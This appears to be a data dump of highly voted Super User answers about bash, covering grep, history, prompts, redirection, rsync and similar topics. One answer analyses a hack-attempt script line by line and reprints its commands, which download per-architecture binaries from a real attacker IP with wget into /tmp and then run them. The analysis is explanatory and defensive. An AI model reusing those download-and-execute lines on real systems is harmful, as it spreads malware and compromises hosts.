"grep for ""term"" and exclude ""another term""","537619","<linux><bash><search><grep>","35","<p>To <em>and</em> expressions with grep you need two invocations:</p>

<pre><code>grep -Ei ""search term"" | grep -Eiv ""exclude term""
</code></pre>

<p>If the terms you are searching for are not regular expressions, use fixed string matching (<code>-F</code>) which is faster:</p>

<pre><code>grep -F ""search term"" | grep -Fv ""exclude term""
</code></pre>
"
"Bash autocomplete like zsh","288714","<bash><zsh><autocomplete>","35","<p>I use </p>

<pre><code>bind 'TAB:menu-complete'
</code></pre>

<p>to achieve it</p>
"
"Accidentally sourced .bash_history","609564","<bash>","35","<p>If it's a local machine, start a new terminal and kill the shell in question.</p>

<p>If it's a remote machine, ssh in and kill the shell in question.</p>
"
"Bash command to cut output after x number of lines","39603","<linux><bash><gnu>","34","<p>Use <a href=""http://www.gnu.org/software/coreutils/manual/html_node/head-invocation.html"" rel=""noreferrer""><strong>head</strong></a>:</p>

<pre><code>ls -l | head -n 15
</code></pre>

<p>10 lines is the default. Read the <a href=""http://man7.org/linux/man-pages/man1/head.1.html"" rel=""noreferrer""><strong>head</strong></a> man page for more options. </p>

<p>(older versions of <strong>head</strong> also support usage without the explicit <code>-n</code> as in <code>head -15</code>)</p>
"
"How to upload a file from the command line with FTP or SSH?","82445","<command-line><bash><ssh><ftp>","34","<p>You can use <code>scp</code> to copy to a remote machine.</p>

<pre><code>scp &lt;file to upload&gt; &lt;username&gt;@&lt;hostname&gt;:&lt;destination path&gt;
</code></pre>
"
"How do I remove a file in Linux whose name looks like it's ONLY a hyphen, as in ""-""","347505","<linux><perl><bash>","34","<p>This used to be posted in the Usenet FAQs for Unix&mdash;I see it is in the <a href=""http://www.gnu.org/software/coreutils/faq/#How-do-I-remove-files-that-start-with-a-dash_003f"" rel=""noreferrer"">GNU Core Utility FAQs</a>.  There were at least five different methods, but this works well:</p>

<pre><code>$ rm ./-
</code></pre>

<p>If a filename contains untypeable characters, then use:</p>

<pre><code>$ rm -i *
</code></pre>

<p>The <code>-i</code> flag asks for confirmation for each file if it should be removed or not.</p>
"
"Comments in a multi-line bash command","238791","<bash><pipe><comments><sh>","34","<p>Put the pipes at the end of line with the comments after it:</p>

<pre><code>$ echo 'foo' |
sed 's/f/a/' | # change first f to a
sed 's/o/b/' | # change first o to b
sed 's/o/c/'   # change second o to c
abc
</code></pre>
"
"What's the ZSH equivalent of BASH's $PROMPT_COMMAND?","735660","<bash><shell><zsh><environment-variables>","33","<p>The simplest approach to emulate bash's <code>$PROMPT_COMMAND</code> which comes to my mind is to use the <code>precmd</code> hook, as you already figured out. Define it as</p>

<pre><code>precmd() { eval ""$PROMPT_COMMAND"" }
</code></pre>

<p>and you can do something like that:</p>

<pre><code>$ PROMPT_COMMAND='echo Hello, it is now $(date)'
Hello, it is now Mon, Mar 31, 2014 7:08:00 PM
$ whoami      
user
Hello, it is now Mon, Mar 31, 2014 7:08:21 PM     
$
</code></pre>

<p>Please note the single quotes in that example, otherwise <code>$(date)</code> will get expanded too early, i.e. already when defining <code>$PROMPT_COMMAND</code> and not when called before the prompt.</p>

<hr>

<p>If you want to preserve (and don't want to alter) the existing definition, you can use that approach:</p>

<pre><code>$ prmptcmd() { eval ""$PROMPT_COMMAND"" }
$ precmd_functions=(prmptcmd)
</code></pre>

<p>With that the <code>prmptcmd</code> functions is executed after the existing <code>precmd()</code> function.</p>

<hr>

<p>Finally, here is a way which is suitable for use in a program package, which neither should modify user or system files nor can enter the commands interactive.</p>

<p>An example to spawn a bash session could be</p>

<pre><code>PROMPT_COMMAND=""echo foo"" bash
</code></pre>

<p>To spawn zsh you can use</p>

<pre><code>ZDOTDIR=/program/dir zsh
</code></pre>

<p>which causes <code>/program/dir/.zshrc</code> to be sourced. In this file the <code>precmd()</code> hook can be defined as explained above. If you want the user's settings <em>in addition</em> include <code>source $HOME/.zshrc</code> etc. in the program's .zshrc, too.
This setup is maintainable, as no files outside the program directory are modified.</p>

<hr>

<p>As a last addition, here is a proof of concept how to keep the newuser welcome, too. Use the following code in your <code>/program/dir/.zshenv</code> rc config file:</p>

<pre><code>echo define precmd, traps, etc.

autoload -Uz zsh-newuser-install

if [[ ! -e ""$HOME/.zshrc"" ]]; then
  zsh-newuser-install -f
  mv $ZDOTDIR/.zshrc $HOME/.zshrc
else
  builtin source $HOME/.zshrc
fi
</code></pre>
"
"How do I rename files with spaces using the Linux shell?","295994","<linux><bash><shell>","33","<p>Escape the space, e.g. <code>Spring\ 2011</code>, or use quotes, e.g. <code>'Spring 2011'</code>. In the future, it's typically a bad idea to use file names with spaces in them on any *NIX.</p>

<p>If you've got <code>rename</code>, you can use this:</p>

<pre><code>rename ' ' '_' [filenames...]
</code></pre>
"
"What is the equivalent of bash's !$ and !! in the fish shell?","719531","<command-line><bash><shell><fish>","33","<p><kbd>Alt</kbd>-<kbd>Up arrow</kbd> gives you the last argument from the previous command. Subsequent pushes cycle throught prior arguments.</p>

<p>I haven't found a satisfactory equivalent to <code>!!</code>, except <kbd>Up</kbd> then <kbd>Ctrl</kbd>-<kbd>A</kbd></p>
"
"Use rsync to copy all files except for certain filenames with a certain extension","105231","<command-line><bash><find><rsync><cp>","33","<p>This would be <strong>significantly easier</strong> using <a href=""http://en.wikipedia.org/wiki/Rsync"" rel=""noreferrer"">rsync</a> with its <code>--exclude</code> switch.</p>

<pre><code>rsync -av --exclude='*.FOO' --exclude='*.BAR' --exclude='*.ZIM' /source /dest
</code></pre>

<p>The <code>-v</code> switch will provide verbose output on which files are being synchronised.</p>
"
"How do I start in bash when ssh'ing into my server?","546761","<linux><bash><debian><sh>","33","<p>As a regular user, you can change your default login shell using the <code>chsh</code> command. Here is an example:</p>

<pre><code>chsh -s /bin/bash
</code></pre>

<p>Another option is to use usermod as root:</p>

<pre><code>usermod -s /bin/bash username
</code></pre>
"
"How can I compare a variable to a text string, rather than integer, in an if/else statement?","543793","<bash><shell-script><bash-scripting>","33","<p>Something like this:</p>

<pre><code>act=""add""
if [[ $act = ""add"" ]]
then
    echo good
else
    echo not good
fi
</code></pre>

<p><code>-eq</code> is for number comparison, use <code>=</code> for string comparison</p>
"
"Why does this bash prompt sometimes keep part of previous commands when scrolling history?","382456","<bash><prompt>","33","<p>Somewhere your prompt is fubar. What usually happens is that your shell thinks its outputting non-printable term codes and expecting it to take up space.  The best advice I can give you is to systematically add to (or take away from) your prompt until this behavior stops to isolate the code that is causing this issue.</p>
"
"What is the difference between &> and >& in bash?","335396","<linux><bash><redirection>","32","<p>From the <code>bash man</code> page:</p>

<pre><code>There  are  two  formats  for  redirecting standard output and standard
   error:

          &amp;&gt;word
   and
          &gt;&amp;word

   Of the two forms, the first is preferred.  This is semantically equiva-
   lent to

          &gt;word 2&gt;&amp;1
</code></pre>

<p>Read the <code>redirection section</code> of the bash man page.</p>
"
"How do I reload .inputrc using a bash script?","419670","<bash><readline><inputrc>","32","<p>Use the <code>bind</code> command:</p>

<pre><code>bind -f ~/.inputrc
</code></pre>

<p>See <code>help bind</code> for more information:</p>

<pre class=""lang-none prettyprint-override""><code>-f  filename       Read key bindings from FILENAME.
</code></pre>
"
"How to tar/untar the output on the fly","345376","<bash><tar><stdout>","32","<p><strong>The same <em><code>-f -</code></em> option</strong> works for tarring as well.</p>

<pre><code>tar -cf - something | tar -C somefolder -xvf -
</code></pre>

<p>GNU tar uses stdio by default:</p>

<pre><code>tar -c something | tar -C somefolder -xv
</code></pre>

<hr>

<p>rsync is also popular.</p>

<pre><code>rsync -av something/ somefolder/
</code></pre>
"
"What is the 'dot space filename' command doing in bash?","1136409","<bash><export>","32","<p>The <code>.</code> (""dot"") command is a synonym/shortcut for the shell's built-in <code>source</code> command. </p>

<p>It causes the named shell script to be read in and executed within the current shell context (rather than a subshell). This allows the sourced script to modify the environment of the calling shell, such as setting variables and defining shell functions and aliases. </p>
"
"How to replace multiple spaces by one tab","241018","<linux><bash><text-manipulation>","32","<p>To convert sequences of <strong>more than one space</strong> to a tab, but <strong>leave individual spaces alone</strong>:</p>

<pre><code>sed 's/ \+ /\t/g' inputfile &gt; outputfile
</code></pre>

<p>To do this for a number of files:</p>

<pre><code>for inputfile in *
do
    sed 's/ \+ /\t/g' ""$inputfile"" &gt; tmpfile &amp;&amp; mv tmpfile ""$inputfile""
done
</code></pre>

<p>or</p>

<pre><code>for inputfile in *
do
    sed -i.bak 's/ \+ /\t/g' ""$inputfile""
done
</code></pre>

<p>or</p>

<pre><code>find . -type f -exec sed -i.bak 's/ \+ /\t/g' {} \;
</code></pre>
"
"What does this bash script do? [Hack Attempt]","1356359","<linux><bash><apache-http-server><shell-script>","32","<p>Line by line:</p>

<pre><code>#!/bin/sh
</code></pre>

<p>Establishes the <code>sh</code> shell, whichever that is, as the shebang line. <code>sh%20/tmp/ks</code> in the request overrides this, so this line is treated as a normal comment and ignored.</p>

<pre><code>u=""asgknskjdgn""
</code></pre>

<p>Declares an arbitrary name, presumably to avoid colliding with other filenames. I'm not sure why they wouldn't just use <code>mktemp</code>, but maybe that is not available on all platforms.</p>

<pre><code>bin_names=""mmips mipsel arm arm7 powerpc x86_64 x86_32""
</code></pre>

<p>Enumerates several common CPU architectures.</p>

<pre><code>http_server=""80.211.173.159""
http_port=80
</code></pre>

<p>The server which has the exploit.</p>

<pre><code>cd /tmp/||cd /var/
</code></pre>

<p>Tries to change directory to somewhere your web server is likely to be able to create files. I believe SELinux will help with this, by enforcing much stricter rules about what the web server can do than the file system does on its own.</p>

<pre><code>for name in $bin_names
    do
</code></pre>

<p>For each CPU architecture…</p>

<pre><code>    rm -rf $u
</code></pre>

<p>Removes previously tried exploit programs. Unnecessary because of the next line, so can be ignored.</p>

<pre><code>    cp $SHELL $u
</code></pre>

<p>Copies the current shell executable (<code>/bin/sh</code>). Can be ignored because of the line after next.</p>

<pre><code>    chmod 777 $u
</code></pre>

<p>Makes everyone have full access to the new file. This should have been after the <code>wget</code> command, which is either a sign of a shell scripting newbie or a misdirection technique.</p>

<pre><code>    &gt;$u
</code></pre>

<p>Empties out the file. Pointless because of the next line.</p>

<pre><code>    wget http://$http_server:$http_port/$name -O -&gt; $u
</code></pre>

<p>Overwrites the file with the exploit script for this architecture. <code>-O -&gt; $u</code> could have been written <code>-O - &gt; $u</code> (the hyphen indicates that the download should be written to standard output) which is equivalent to <code>-O $u</code>.</p>

<pre><code>    ./$u $name
</code></pre>

<p>Runs the exploit script with the architecture as the first argument.</p>

<pre><code>done
</code></pre>

<p>Ends the loop.</p>

<p>It looks like this is a trivial exploit attempt script, trying known exploits against various CPU platforms. I do not know why it overwrites <code>$u</code> three times, but those operations could simply be remains from an earlier iteration of the script. Presumably that earlier version had the exploits hard coded rather than dynamically served - the former is easier but almost guarantees that the script will be less effective over time as bugs are patched.</p>
"
"Cygwin fatal error unable to remap.. What does it mean?","194529","<windows-7><bash><cygwin>","31","<p>You need to run the <code>rebaseall</code> command from the <code>rebase</code> package to fix the problem.</p>

<ol>
<li>Install the <code>rebase</code> package using the Cygwin <code>setup.exe</code> utility</li>
<li>Close everything running that uses the <code>cygwin1.dll</code></li>
<li>Open a Cygwin shell</li>
<li>Type <code>rebaseall</code> at the prompt</li>
</ol>

<p>Rebasing is usually only required when installed packages are installed that modify libraries that are dynamically loaded. I'll admit a bad habit of always running <code>rebaseall</code> after installing or upgrading packages in a Cygwin install rather than waiting for that error you hit to show up.</p>

<p>As for why you got that error and how rebasing solves the problem, <a href=""http://www.cygwin.com/ml/cygwin/2009-05/msg00413.html"" rel=""noreferrer"">this post</a> has this to say about it:</p>

<blockquote>
  <p>You have it backwards.  Forking doesn't break the relocation.  Relocation
  breaks forking.  cygwin1.dll needs to have a very special memory layout to
  implement the fork semantics in Win32.  If this memory layout is disrupted,
  fork breaks.  Relocating cygwin1.dll disrupts the required memory layout.
  'rebaseall' does its best to locate all Cygwin DLLs that it knows of
  into a layout that avoids collisions.  This maintains the required
  memory layout so fork can do its job.</p>
</blockquote>
"
"Can the output of one command be piped to two other commands?","7448","<unix><bash>","31","<p>It sounds like the <code>tee</code> command will do what you want.</p>

<p>The key is to use</p>

<pre><code>&gt;( )
</code></pre>

<p>for <a href=""http://tldp.org/LDP/abs/html/process-sub.html"" rel=""noreferrer"">process substitution</a>.  With <code>tee</code>, use the following pattern:</p>

<pre><code>tee &gt;(proc1) &gt;(proc2) &gt;(proc3) | proc4
</code></pre>

<p>So if you wanted to use the output of <code>ls</code> as input to two different <code>grep</code> programs, save the output of each <code>grep</code> to different files, and pipe all of the results through <code>less</code>, try:</p>

<pre><code>ls -A | tee &gt;(grep ^[.] &gt; hidden-files) &gt;(grep -v ^[.] &gt; normal-files) | less
</code></pre>

<p>The results of the <code>ls -A</code> will be ""piped"" into both <code>grep</code>s.  The file <code>hidden-files</code> will have the contents from the output of the first <code>grep</code>, and <code>normal-files</code> will have the results of the second <code>grep</code>.  <del>All of the files will be shown in the pager <code>less</code>.</del> <strong>EDIT</strong>: what you see in <code>less</code> is the <strong>same exact output</strong> of <code>ls -A</code>, not the result of the <code>grep</code>s. If you want to modify the output from <code>ls -A</code> to <code>less</code>, (e.g. swapping the order so normal files are listed before hidden ones) then try this:</p>

<pre><code>ls -A | tee &gt;(grep ^[.]) &gt;(grep -v ^[.]) &gt;/dev/null | less
</code></pre>

<p>Without <code>&gt;/dev/null</code>, the output of <code>grep</code>s would be appended to the output of <code>ls -A</code> instead of replacing it.</p>

<p><a href=""http://linux.byexamples.com/archives/144/redirect-output-to-multiple-processes/"" rel=""noreferrer"">source</a></p>
"
"How to make mouse wheel scroll the less pager using bash and gnome-terminal?","455212","<bash><scrolling><less><gnome-terminal>","31","<p>The computer where <code>less</code> scrolled had <code>LESS=-r</code>,
the other had <code>LESS=-asXFMMRqix8</code>.</p>

<p>From <a href=""http://man7.org/linux/man-pages/man1/less.1.html"" rel=""nofollow noreferrer"">the <code>less</code> man page</a>:</p>

<blockquote>
  <p><code>-q</code> or <code>--quiet</code> or <code>--silent</code><ul><ul>
                Causes  moderately  ""quiet""  operation: the terminal bell is not
                rung if an attempt is made to scroll past the end of the file or
                before the beginning of the file.  If the terminal has a ""visual
                bell"", it is used instead.  The bell will  be  rung  on  certain
                other  errors, such as typing an invalid character.  The default
                is to ring the terminal bell in all such cases.</ul></ul></p>
  
  <p><code>-X</code> or <code>--no-init</code><ul><ul>
                Disables sending the termcap initialization and deinitialization
                strings  to  the  terminal.   This is sometimes desirable if the
                deinitialization string does something unnecessary,
  like  clearing the screen.</ul></ul></p>
</blockquote>

<p>The <code>-X</code> option prevented scrolling all together and the <code>-q</code> option caused the pager to enter a non-scrollable state when scrolling past the beginning or end of file.</p>

<p>My options are now <code>LESS=-asrRix8</code>.</p>
"
"How to change the default shell in Cygwin?","940529","<bash><shell><cygwin><zsh><oh-my-zsh>","31","<p>The answer depends on how you start Cygwin.</p>

<p>If you start Cygwin with <em>Cygwin.bat</em>, modify the last line of <code>/Cygwin.bat</code> (usually <code>C:\cygwin\</code> or <code>C:\cygwin64\</code>).</p>

<p>If you start Cygwin with <em>mintty</em>, then add the shell as a parameter:  <code>mintty /usr/bin/zsh -</code></p>
"
"Linux: coloring bash prompt will break carriage return","367275","<bash><terminal><bashrc><ubuntu-11.10><ps1>","31","<p>You must wrap all escape sequences between <code>\[</code> and <code>\]</code> in order for 'readline' to correctly calculate the prompt's visible length. Without them, 'readline' thinks the prompt is longer than it is, and doesn't know when the text reaches the margin.</p>

<pre>
PS1=""<b>\[</b>\e[;31m<b>\]</b>[\u@\h \W]\$ <b>\[</b>\e[m<b>\]</b>""
</pre>
"
"Continue a ""ctrl-z""-ed job in background","213724","<bash><job-control>","31","<p><strong><code>bg</code></strong></p>

<p>See also ""JOB CONTROL"" in <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Job-Control""><code>bash</code>'s manual page</a>.</p>
"
"How do I keep my bash history across sessions?","211966","<linux><bash><fedora><history>","31","<p>Which history? bash-history? If you're losing bash history and you have multiple sessions at a time, it's because each session is overwriting the other sessions' history. </p>

<p>You probably want to tell bash to not overwrite the history each time, but rather to append to it. You can do this by modifying your .bashrc to run <code>shopt -s histappend</code>. </p>

<p>You can also increase the size of your history file by exporting HISTSIZE to be a large-ish number (it's in bytes, so 100000 should be plenty).</p>
"
"How can I get a specific argument from a previous command in bash?","210846","<command-line><bash><command-line-arguments>","31","<p>In <code>!*</code>, <code>!</code> is the <a href=""http://www.gnu.org/software/bash/manual/bash.html#History-Interaction"" rel=""nofollow noreferrer"">history expansion</a> prefix, and <code>*</code> is the <a href=""http://www.gnu.org/software/bash/manual/bash.html#Word-Designators"" rel=""nofollow noreferrer"">word designator</a> that means all arguments. You can memorize the general syntax as bang-line-colon-column (<code>!</code>line<code>:</code>column). There are many possible shortcuts: the default line is the previous line, the default column specifier is “all”, and you can leave off the colon if the column specifier is non-numeric (but <code>!3</code> would mean line 3). You can use <code>!:0</code> to refer to the command name, <code>!:1</code>, <code>!:2</code>, etc, to refer to successive arguments, <code>!:$</code> for the last word, <code>!:*</code> for all arguments, and more.</p>

<p>See also <a href=""https://unix.stackexchange.com/questions/6/what-are-your-favorite-command-line-features-or-tricks/67#67"">this post by Michael Mrozek</a> at <a href=""https://unix.stackexchange.com/"">Unix Stack Exchange</a>.</p>
"
"Bash/ZSH: Undoing 'disown'","184047","<bash><shell><zsh>","31","<p>Considering how linux jobs and process ownership works, I'm afraid it's not really possible to re-own a process, without help from the adopting process.</p>

<p>A parent may 'disown' a child, which is then 'adopted' by the process named 'init'.  System security prevents someone from grabbing someone else's processes.  When you disown it, a process becomes someone else's (init's) to control.  You as the 'user' could still kill the process, but you can't get it back.  Attempting to coerce init to return your process is unlikely to work, as init doesn't even read mail.</p>

<p>As mean as it sounds, it really boils down to the answer of ""Don't do that!"".</p>
"
"Is there a way to make bash more TAB friendly?","59175","<linux><command-line><unix><bash>","31","<p>To get the ‘cycle through possible completions’ behavior, copy the following into an appropriate place in your .bashrc file:</p>

<pre><code>[[ $- = *i* ]] &amp;&amp; bind TAB:menu-complete
</code></pre>

<p>Also, <a href=""http://bash-completion.alioth.debian.org/"" rel=""noreferrer"">bash-completion</a> provides many extra kinds of completion besides just pathname completion. For example, menu-complete works fine with Git's bash-completion module to complete command names, option names, etc.</p>
"
"How does Mac's command line compare to Linux?","179368","<linux><macos><mac><command-line><bash>","31","<p>Bash is bash so the shell and its built-ins are the same. But be aware that the behavior of some tools like <code>ps</code> or <code>head</code> can differ in the details thus your scripts might fail.</p>
"
"equivalent ""echo on"" for linux?","387007","<linux><command-line><bash><echo>","31","<p>Use <code>bash -v</code>.</p>

<p>This is the script:</p>

<pre><code>#!/bin/bash -v

echo ""Hello, World"" | sed 's|Hello|Goodbye|'

echo ""Done.""
</code></pre>

<p>This is the output:</p>

<pre><code>#!/bin/bash -v

echo ""Hello, World"" | sed 's|Hello|Goodbye|'
Goodbye, World

echo ""Done.""
Done.
</code></pre>

<p>Unfortunately, there is no special marker like <code>PS4</code> for printing expanded commands. You could combine both though to quickly identify commands:</p>

<pre><code>#!/bin/bash -vx

echo ""Hello, World"" | sed 's|Hello|Goodbye|'
+ echo 'Hello, World'
+ sed 's|Hello|Goodbye|'
Goodbye, World

echo ""Done.""
+ echo Done.
Done.
</code></pre>
"
"Can you share wisdom on using HISTIGNORE in bash?","232885","<bash><terminal>","31","<p>I ignore <code>ls</code> without commands, <code>bg</code>, <code>fg</code>, <code>exit</code>, <code>pwd</code>, <code>clear</code>, <code>mount</code> and <code>umount</code>:</p>

<p>If you include this in your <code>HISTIGNORE</code> string you can suppress anything as you wish by adding a space at the front of the command:</p>

<pre><code>""[ \t]*"" 
</code></pre>

<p>This is my <code>HISTIGNORE</code>:</p>

<pre><code>HISTIGNORE=""&amp;:ls:[bf]g:exit:pwd:clear:mount:umount:[ \t]*""
</code></pre>

<p>I've excluded some other stuff that I have in there that are repetitive commands that are unique to my server. Anything you do that is simple is a good thing to exclude.</p>

<p>I have other stuff which I have forgotten to add but I'm miles away from my Linux box so I am going off of memory. </p>
"
"How do I copy file named starting with a dot?","265220","<linux><bash><shell><regex>","31","<p>The reason is because in <code>bash</code>, <code>*</code> does not include files starting with dot (<code>.</code>).</p>

<p>You can run</p>

<pre><code>cp A/.* B
</code></pre>

<p>It will warn you that it did not copy <code>.</code> or <code>..</code>, or any subdirectories, but this is fine.</p>

<p>Or, if you want to copy dot files and normal files together, run</p>

<pre><code>cp A/.* A/* B
</code></pre>

<p>You could also run</p>

<pre><code>shopt -s dotglob
cp A/* B
</code></pre>

<p>which will work in <code>bash</code>, but not <code>sh</code>.</p>

<p>And if you don't mind subdirectories being copied too, then this is the easiest:</p>

<pre><code>cp -R A/ B
</code></pre>

<p>Tip: If ever wildcards aren't doing what you expect, try running it with echo, e.g.</p>

<pre><code>$ echo A/*
A/file1 A/file2

$ echo A/.*
A/. A/.. A/.hidden1 A/.hidden2

$ echo A/.* A/*
A/. A/.. A/.hidden1 A/.hidden2 A/file1 A/file2

$ shopt -s dotglob
$ echo A/*
A/file1 A/file2 A/.hidden1 A/.hidden2
</code></pre>
"
"How to enter login information for a website from the linux command line","640839","<linux><command-line><bash><login><website>","30","<p>I finally found a way to automatically log in using <code>elinks</code>. It works and it is even easy to configure!</p>

<p>Two options need to be set. This can done by adding the following lines in <code>~/.elinks/elinks.conf</code> (if the file is not there, create one) or by changing the values at the respective positions in the options dialog within <code>elinks</code>:</p>

<pre><code>    # Save username and password for later use
set document.browse.forms.show_formhist = 1
    # Do not ask for confirmation before a form is submitted
set document.browse.forms.confirm_submit = 0
</code></pre>

<p>Steps for a scriptable autologin are then:</p>

<ul>
<li>Set those two options</li>
<li>Open the login page in <code>elinks</code>, fill the forms and submit them.</li>
<li>Choose to remember name and password for later use.</li>
<li>Close elinks</li>
<li>Run <code>elinks -auto-submit http://somesite.com</code></li>
</ul>

<p>The latter command should perform the automatic login without further user interaction.</p>

<p>I actually use <code>timeout 1m elinks -auto-submit http://somesite.com &amp;</code>, so that I do not have an idling elinks process running in the background all the time.</p>
"
"Any shortcut for ""cd ..""?","259601","<bash><shell><shortcuts>","30","<p>Not by default (There might be some exceptions to this), there isn't. But if you use the <code>alias</code> command you can create a shortcut like this:</p>

<pre><code>alias ..=""cd ..""
</code></pre>

<p>This will allow you to use the command <code>..</code> to do <code>cd ..</code>.</p>
"
"Disable autocomplete hints on iTerm2","1089955","<macos><mac><bash><autocomplete><iterm2>","30","<p>You can disable the auto command completion by navigating to the following menu:</p>

<p><code>View</code> <code>&gt;</code> <code>Auto command completion</code></p>
"
"bash: ulimit: core file size: cannot modify limit: Operation not permitted","79717","<linux><bash>","29","<p>Grep for a hard limit setting in your bash initialization files.  From the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bourne-Shell-Builtins"" rel=""noreferrer"">bash man page</a>.</p>

<blockquote>
  <p>A hard limit cannot be increased once it is set; a soft limit may  be  increased  up  to  the value of the hard limit.</p>
</blockquote>

<p>The hard limit is set via the ulimit -H flag.  It may be set in /etc/bash* or /etc/profile* files.  Look for a ulimit -Hc setting.</p>
"
"Equivalent to ^D (in bash) for cmd.exe?","291224","<windows><command-line><bash><keyboard-shortcuts>","29","<p>No. <kbd>Ctrl</kbd><kbd>D</kbd> on *nix generates a EOF, which various shells interpret as running <code>exit</code>. The equivalent for EOF on Windows is <kbd>Ctrl</kbd><kbd>Z</kbd>, but cmd.exe does not interpret this specially when typed at the prompt.</p>
"
"'No such file or directory' error in bash, but the file exists?","344533","<ubuntu><bash><android>","29","<p>It's an executable file that misses required libraries. Use <code>ldd</code> to see what it needs, then provide these files.</p>
"
"Prevent user typing accidental space between rm and wildcard","864478","<linux><bash><rm>","29","<p>A <code>DEBUG</code> trap could be written to cancel commands that look suspicious. The following, or code similar to it, can be added to your <code>~/.bashrc</code>:</p>

<pre><code>shopt -s extdebug
checkcommand() {
  if [[ $BASH_COMMAND = 'rm -r'*' *' ]]; then
    echo ""Suppressing rm -r command ending in a wildcard"" &gt;&amp;2
    return 1
  fi
  # check for other commands here, if you like
  return 0
}
trap checkcommand DEBUG
</code></pre>

<p>Adjust the logic to taste.</p>

<p>(I don't actually expect this approach to be useful -- too many ways to mess up a command destructively to find them testing one-by-one -- but it provides a literal answer to the question).</p>
"
"Linux Shell: Copy output into clipboard w/o using the Mouse?","104981","<linux><bash><shell>","29","<p>You can get and use the <code>xclip</code> and <code>xsel</code> commands. Instructions for obtaining and using them are <a href=""http://www.cyberciti.biz/faq/xclip-linux-insert-files-command-output-intoclipboard/"" rel=""noreferrer"">here</a>.</p>

<p>Without any arguments, <code>xclip</code> copies into the primary (middle-click-paste) clipboard instead of the <kbd>Ctrl</kbd>-<kbd>C</kbd>/<kbd>Ctrl</kbd>-<kbd>V</kbd>/right-click-context-menu clipboard.</p>

<p>Try <code>echo foo | xclip -selection clipboard</code> to copy some text into the latter.</p>

<p>To output the clipboard to standard out: <code>xclip -selection clipboard -o</code></p>

<p>The equivalent utility for MacOS is <code>pbcopy</code> (and <code>pbpaste</code>)</p>
"
"Is there a binary-safe ""triple less than"" <<< operator in bash?","342982","<bash><redirection>","29","<p>The <a href=""http://linux.die.net/abs-guide/x15683.html"" rel=""noreferrer"" title=""Bash Here String"">here string</a> redirection (<code>&lt;&lt;&lt;</code>) is a simple form of <a href=""http://tldp.org/LDP/abs/html/here-docs.html"" rel=""noreferrer"" title=""Bash Here Document"">here document</a> redirection (<code>&lt;&lt;</code>). Here string redirection is not ""binary safe""; Bash will perform expansion on the here string.  In addition, Bash will append a new-line to the end of the here string (issue the command <code>xxd -p &lt;&lt;&lt; ""foo""</code> and you'll get <code>666f6f0a</code> in return).</p>

<p>Your only safe bet, excluding pipes, is <a href=""http://tldp.org/LDP/abs/html/io-redirection.html"" rel=""noreferrer"" title=""Bash I/O Redirection"">I/O redirection</a>.</p>

<p>Similar not binary safe question <a href=""https://stackoverflow.com/questions/14840178/using-a-bash-variable-in-place-of-a-file-as-input-for-an-executable"" title=""bash variable in place of a file as input for an executable"">here</a>. You can store encoded data and try this</p>

<pre><code>COMMAND_WITH_BIN_INPUT &lt;(uudecode &lt;(echo ""$uuEncodedData"")) 
</code></pre>

<p>however this is not far from </p>

<pre><code>echo ""$uuEncodedData""|uudecode|COMMAND_WITH_BIN_INPUT
</code></pre>

<p>but without pipe metachar.</p>
"
"Is there a directory history for bash?","299694","<bash><history>","29","<p>Have a look at <a href=""https://github.com/joelthelion/autojump"" rel=""noreferrer"">autojump</a>:</p>
<blockquote>
<p>One of the most used shell commands is “cd”. A quick survey among my friends revealed that between 10 and 20% of all commands they type are actually cd commands! Unfortunately, jumping from one part of your system to another with cd requires you to enter almost the full path, which isn’t very practical and requires a lot of keystrokes.</p>
<p>autojump is a faster way to navigate your filesystem. It works by maintaining a database of the directories you use the most from the command line. The jumpstat command shows you the current contents of the database. You need to work a little bit before the database becomes usable. Once your database is reasonably complete, you can “jump” to a commonly &quot;cd&quot;ed directory by typing:<br />
<code>j dirspec</code></p>
</blockquote>
"
"What is <<!END in a Bash script?","1530389","<bash><bash-scripting>","29","<p>It's a <a href=""https://www.gnu.org/software/bash/manual/bash.html#Here-Documents"" rel=""noreferrer"">Here Document</a> -- the lines between <code>&lt;&lt;!END</code> and <code>!END</code> are fed to the stdin of wlst.sh </p>

<p>It could also be expressed as:</p>

<pre class=""lang-bsh prettyprint-override""><code>echo ""connect('user','pw');
p=redeploy('application');
p.printStatus();
exit();"" | /u01/app/oracle/middleware/oracle_common/common/bin/wlst.sh
</code></pre>

<p>but without the potential effects of running the command in a subshell.</p>

<p>It could also also be expressed as:</p>

<pre class=""lang-bsh prettyprint-override""><code>echo ""connect('user','pw');
p=redeploy('application');
p.printStatus();
exit();"" &gt; someFile
/u01/app/oracle/middleware/oracle_common/common/bin/wlst.sh &lt; someFile
rm someFile
</code></pre>
"
"How do I refresh directory in BASH?","702402","<linux><bash><filesystems>","29","<p>Your script is most likely removing the directory, and not just the files which are there.  So, when you have <code>cd</code>'d into it, and the directory is removed, you do <code>ls</code> on a directory which does not actually exist.</p>

<p>By <code>cd ..</code> and <code>cd (directory)</code> you move up and back into the (newly created) directory, and the files are there as you expect.</p>

<p>The best alternative is instead of <code>cd</code>ing in and out of the directory, is to add the directory name to your <code>ls</code> command, and run it from the parent directory.  So, <code>ls YourSubdirectory</code> instead of just <code>ls</code>.</p>
"
"How can I pipe output of ffmpeg to ffplay?","322216","<bash><ffmpeg><pipe>","28","<p>I do not know if it is <code>ffmpeg</code> that cannot output its data to stdout, or <code>ffplay</code> that cannot take its input from stdin.</p>

<p>If it is <code>ffmpeg</code> that cannot output its data to stdout:</p>

<pre><code>capture /dev/stdout | ffmpeg -i - &gt;(ffplay 2&gt; /dev/null)
</code></pre>

<p>(You migth need to add a <code>-</code> argument to <code>ffplay</code> so it takes its input from stdin.)</p>

<p>If it is <code>ffplay</code> that cannot take its input from stdin:</p>

<pre><code>ffplay &lt;(capture /dev/stdout | ffmpeg -i -) 2&gt; /dev/null
</code></pre>

<p>For more informations about the <code>&lt;(command)</code> and <code>&gt;(command)</code> construct, see the <em>Process Substitution</em> section of the bash manual.</p>
"
"Command line: Extract substring from output","697667","<linux><command-line><bash>","28","<pre><code>$ echo ""Watermelons and cucumbers"" | cut -d ' ' -f 3
cucumbers
</code></pre>

<p>The <code>-d ' '</code> tells <code>cut</code> to split on spaces. <code>-f 3</code> selects the third column.</p>

<p>You can also use <code>awk</code>, which does the splitting based on space already and makes the columns available as <code>$1</code>, <code>$2</code>, … </p>

<pre><code>$ echo ""Watermelons and cucumbers"" | awk '{ print $3 }'
cucumbers
</code></pre>
"
